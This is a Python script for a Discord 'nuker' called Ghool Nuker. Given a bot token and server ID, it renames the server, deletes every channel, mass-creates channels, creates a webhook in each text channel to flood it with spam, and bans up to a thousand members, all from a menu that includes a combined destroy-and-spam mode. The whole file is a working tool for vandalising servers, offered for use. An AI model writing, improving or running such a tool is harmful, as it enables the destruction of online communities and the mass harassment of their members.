import asyncio

import aiohttp

import os

import time

from pystyle import Colors, Colorate, Center



async def change_server_name(session):

    new_name = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter New Server Name >> "))

    async with session.patch(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers, json={"name": new_name}) as r:

        if r.status in [200, 201, 204]:

            print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Server name changed to >> {new_name}"))

        elif r.status == 429:

            print(Colorate.Horizontal(Colors.red_to_white, " [$] Rate-limited. Retrying..."))

        else:

            print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to change server name. Status: {r.status}"))

    await asyncio.sleep(1)



async def delete_channels(session):

    async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers) as r:

        channels = await r.json()

    

    for channel in channels:

        channel_id = channel['id']

        async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as r:

            if r.status == 429:

                print(Colorate.Horizontal(Colors.red_to_white, " [$] Rate-limited. Retrying..."))

                await asyncio.sleep(5)

            elif r.status in [200, 201, 204]:

                print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Deleted channel >> {channel_id}"))

            else:

                print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to delete channel. Status: {r.status}"))



async def create_channels(session):

    channel_name = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Channel Name >> "))

    num_channels = int(input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Number of Channels >> ")))



    for _ in range(num_channels):

        async with session.post(

            f'https://discord.com/api/v9/guilds/{guild_id}/channels',

            headers=headers,

            json={'name': channel_name, 'type': 0},

        ) as r:

            if r.status == 429:

                print(Colorate.Horizontal(Colors.red_to_white, " [$] Rate-limited. Retrying..."))

                await asyncio.sleep(5)

            elif r.status in [200, 201, 204]:

                print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Created channel >> {channel_name}"))



async def banall(session):

    async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000', headers=headers) as r:

        members = await r.json()



    for member in members:

        user_id = member['user']['id']

        async with session.put(f'https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}', headers=headers) as r:

            if r.status == 429:

                print(Colorate.Horizontal(Colors.red_to_white, " [$] Rate-limited. Retrying..."))

                await asyncio.sleep(5)

            elif r.status in [200, 201, 204]:

                print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Banned member >> {user_id}"))

            else:

                print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to ban user. Status: {r.status}"))



async def WebhookSpam(session):

    webhook_name = "Mass Spammer"

    msg = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Message to Spam >> "))

    msg_amt = int(input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Number of Messages >> ")))



    async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers) as r:

        channels = await r.json()

        spam_tasks = []



        for channel in channels:

            if channel['type'] == 0:  # Only text channels

                try:

                    async with session.post(

                        f'https://discord.com/api/v9/channels/{channel["id"]}/webhooks',

                        headers=headers,

                        json={'name': webhook_name},

                    ) as r:

                        if r.status == 429:

                            print(Colorate.Horizontal(Colors.red_to_white, " [$] Rate-limited. Retrying..."))

                            await asyncio.sleep(5)

                        elif r.status in [200, 201, 204]:

                            webhook_raw = await r.json()

                            webhook_url = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'

                            print(Colorate.Horizontal(Colors.blue_to_cyan, f" [$] Webhook created for {channel['name']}"))

                            spam_tasks.append(send_message(webhook_url, msg, msg_amt))

                        else:

                            print(Colorate.Horizontal(Colors.red_to_white, f" [$] Failed to create webhook. Status: {r.status}"))

                except Exception as e:

                    print(f" [$] Exception occurred while creating webhook: {e}")

        await asyncio.gather(*spam_tasks)



async def send_message(hook, message, amount: int):

    async with aiohttp.ClientSession() as session:

        for _ in range(amount):

            await session.post(hook, json={'content': message, 'tts': False})



async def runz(session):

    # Run all actions except change server name and banall

    await delete_channels(session)

    await create_channels(session)

    await WebhookSpam(session)



async def main():

    global headers, guild_id

    token = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Your Bot Token > "))

    guild_id = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Your Guild ID > "))

    name = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Enter Your Username > "))



    os.system(f'title ^| • Ghool Nuker^| User: {name} ^|')

    headers = {

        "Authorization": f"Bot {token}",

        "Content-Type": "application/json"

    }

    os.system('cls' if os.name == 'nt' else 'clear')



    while True:

        print(Colorate.Horizontal(Colors.blue_to_cyan, """▄████  ██░ ██  ▒█████   ▒█████   ██▓    
 ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██▒  ██▒▓██▒    
▒██░▄▄▄░▒██▀▀██░▒██░  ██▒▒██░  ██▒▒██░    
░▓█  ██▓░▓█ ░██ ▒██   ██░▒██   ██░▒██░    
░▒▓███▀▒░▓█▒░██▓░ ████▓▒░░ ████▓▒░░██████▒
 ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
  ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
░ ░   ░  ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
      ░  ░  ░  ░    ░ ░      ░ ░      ░  ░"""))

        

        print(Colorate.Horizontal(Colors.blue_to_cyan, " [$] 1 - Change Server Name"))

        print(Colorate.Horizontal(Colors.blue_to_cyan, " [$] 2 - Delete Channels"))

        print(Colorate.Horizontal(Colors.blue_to_cyan, " [$] 3 - Create Channels"))

        print(Colorate.Horizontal(Colors.blue_to_cyan, " [$] 4 - Mass Spam (Webhook)"))

        print(Colorate.Horizontal(Colors.blue_to_cyan, " [$] 5 - RunZ"))

        print(Colorate.Horizontal(Colors.blue_to_cyan, " [$] 6 - Ban All Members"))



        option = input(Colorate.Horizontal(Colors.blue_to_cyan, " [$] Choose an option >> "))



        async with aiohttp.ClientSession() as session:

            if option == '1':

                await change_server_name(session)

            elif option == '2':

                await delete_channels(session)

            elif option == '3':

                await create_channels(session)

            elif option == '4':

                await WebhookSpam(session)

            elif option == '5':

                await runz(session)

            elif option == '6':

                await banall(session)

            else:

                print(Colorate.Horizontal(Colors.red_to_white, " [$] Invalid option, please choose again."))

        

        print(Colorate.Horizontal(Colors.green_to_cyan, " [$] Action Completed! Returning to menu..."))

        time.sleep(5)

        os.system('cls' if os.name == 'nt' else 'clear')



asyncio.run(main())